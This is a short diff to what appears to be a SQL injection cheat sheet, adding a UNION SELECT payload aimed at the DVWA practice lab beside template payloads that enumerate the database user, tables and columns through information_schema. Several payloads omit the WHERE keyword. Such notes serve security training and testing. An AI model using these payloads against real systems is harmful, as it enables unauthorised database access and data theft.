@@ -18,6 +18,7 @@ UNION SELECT 1,user() /*
 
 Database tables:
 UNION SELECT 1,table_name FROM information_schema.tables table_schema = '[database name]' /*
+UNION SELECT table_name,2 FROM information_schema.tables table_schema = 'dvwa' %23&Submit=Submit#
 
 Table Columns:
 UNION SELECT 1,column_name FROM information_schema.columns table_name = '[table name]' /*
